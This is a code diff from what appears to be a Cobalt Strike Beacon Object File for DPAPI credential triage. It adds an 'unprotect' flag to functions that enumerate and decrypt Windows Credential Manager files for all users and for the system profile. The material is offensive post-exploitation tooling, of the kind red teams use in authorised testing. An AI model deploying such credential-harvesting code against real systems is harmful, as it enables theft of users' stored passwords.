@@ -464,6 +464,7 @@ BOOL triage_system_masterkeys(MASTERKEY_CACHE* cache) {
 typedef struct {
     MASTERKEY_CACHE* cache;
     int found;
+    BOOL unprotect;
 } CRED_TRIAGE_CTX;
 
 static void triage_cred_file_cb(const wchar_t* path, void* ctx) {
@@ -477,27 +478,28 @@ static void triage_cred_file_cb(const wchar_t* path, void* ctx) {
     BeaconPrintf(CALLBACK_OUTPUT, "\n  CredFile     : %s\n", path_str ? path_str : "?");
     if (path_str) intFree(path_str);
 
-    describe_credential(data, data_len, tc->cache, NULL);
+    describe_credential(data, data_len, tc->cache, tc->unprotect, NULL);
     tc->found++;
 
     intFree(data);
 }
 
-BOOL triage_cred_file(MASTERKEY_CACHE* cache, const wchar_t* file_path) {
-    CRED_TRIAGE_CTX ctx = { cache, 0 };
+BOOL triage_cred_file(MASTERKEY_CACHE* cache, const wchar_t* file_path, BOOL unprotect) {
+    CRED_TRIAGE_CTX ctx = { cache, 0, unprotect };
     triage_cred_file_cb(file_path, &ctx);
     return (ctx.found > 0);
 }
 
-BOOL triage_cred_folder(MASTERKEY_CACHE* cache, const wchar_t* folder) {
-    CRED_TRIAGE_CTX ctx = { cache, 0 };
+BOOL triage_cred_folder(MASTERKEY_CACHE* cache, const wchar_t* folder, BOOL unprotect) {
+    CRED_TRIAGE_CTX ctx = { cache, 0, unprotect };
     enumerate_files(folder, NULL, triage_cred_file_cb, &ctx);
     return (ctx.found > 0);
 }
 
 BOOL triage_user_creds(MASTERKEY_CACHE* cache,
                        const wchar_t* target,
-                       const wchar_t* server) {
+                       const wchar_t* server,
+                       BOOL unprotect) {
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging user credentials...\n");
 
     int user_count = 0;
@@ -506,11 +508,11 @@ BOOL triage_user_creds(MASTERKEY_CACHE* cache,
     for (int i = 0; i < user_count; i++) {
         wchar_t cred_path[MAX_PATH * 2];
         swprintf(cred_path, L"%s\\AppData\\Roaming\\Microsoft\\Credentials", users[i]);
-        triage_cred_folder(cache, cred_path);
+        triage_cred_folder(cache, cred_path, unprotect);
 
         /* Also check Local\Credentials */
         swprintf(cred_path, L"%s\\AppData\\Local\\Microsoft\\Credentials", users[i]);
-        triage_cred_folder(cache, cred_path);
+        triage_cred_folder(cache, cred_path, unprotect);
     }
 
     for (int i = 0; i < user_count; i++) intFree(users[i]);
@@ -519,11 +521,11 @@ BOOL triage_user_creds(MASTERKEY_CACHE* cache,
     return TRUE;
 }
 
-BOOL triage_system_creds(MASTERKEY_CACHE* cache) {
+BOOL triage_system_creds(MASTERKEY_CACHE* cache, BOOL unprotect) {
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging system credentials...\n");
 
     wchar_t path[] = L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
-    return triage_cred_folder(cache, path);
+    return triage_cred_folder(cache, path, unprotect);
 }
 
 /* ============================================================
@@ -738,7 +740,7 @@ BOOL triage_user_full(MASTERKEY_CACHE* cache,
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- User Credentials ---\n");
-    triage_user_creds(cache, target, server);
+    triage_user_creds(cache, target, server, FALSE);
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- User Vaults ---\n");
     triage_user_vaults(cache, target, server);
